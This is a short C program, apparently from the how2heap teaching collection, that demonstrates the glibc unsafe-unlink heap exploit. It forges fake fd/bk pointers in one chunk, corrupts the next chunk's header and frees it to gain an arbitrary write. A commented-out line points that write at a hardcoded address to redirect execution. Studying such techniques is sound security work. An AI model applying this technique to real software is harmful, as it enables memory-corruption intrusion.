/*
 * https://github.com/shellphish/how2heap
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

void babo()
{
    printf("%s!\n", "Babo");
}

int main()
{
    int malloc_size = 0x80;
    int header_size = 2;

    chunk0_ptr = (uint64_t*) malloc(malloc_size);
    uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size);

    printf("&chunk0_ptr: %p\n", &chunk0_ptr);
    printf("chunk0_ptr: %p\n", chunk0_ptr);

    chunk0_ptr[1] = sizeof(size_t);
    chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3); // fd
    chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2); // bk

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    chunk1_hdr[0] = malloc_size;
    chunk1_hdr[1] &= ~1;

    free(chunk1_ptr);
    
    printf("chunk0_ptr: %p\n", chunk0_ptr);

    //*(uint64_t*)0x601020 = (uint64_t)babo;

    puts("Done.");

    return 0;
}
